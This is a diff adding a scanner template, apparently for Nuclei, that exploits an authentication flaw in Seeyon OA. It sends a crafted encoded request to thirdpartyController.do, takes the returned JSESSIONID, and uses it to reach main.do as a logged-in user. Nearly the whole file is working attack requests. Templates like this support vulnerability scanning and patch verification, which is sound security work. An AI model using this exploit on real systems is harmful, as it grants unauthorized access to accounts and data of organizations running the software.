@@ -1,0 +1,55 @@
+id: seeyon-oa-arbitrary-auth
+info:
+  name: Seeyon OA Arbitrary Authentication
+  author: Raiynin
+  severity: critical
+  description: |
+    This template exploits an IDOR vulnerability in Seeyon OA's thirdpartyController.do endpoint to gain unauthorized session access.
+  reference:
+    - https://blog.csdn.net/weixin_43227251/article/details/115616761
+
+variables:
+  session: ''
+
+http:
+  - id: "1"
+    method: POST
+    path:
+      - "{{BaseURL}}/seeyon/thirdpartyController.do"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
+    extractors:
+      - type: regex
+        name: session
+        internal: true
+        regex:
+          - "JSESSIONID=(.+?);"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "set-cookie"
+      - type: regex
+        part: header
+        regex:
+          - "JSESSIONID=.+?;"
+
+  - id: "2"
+    method: GET
+    path:
+      - "{{BaseURL}}/seeyon/main.do"
+    headers:
+      Cookie: "JSESSIONID={{session}}"
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "当前已登录了一个用户，同一窗口中不能登录多个用户"
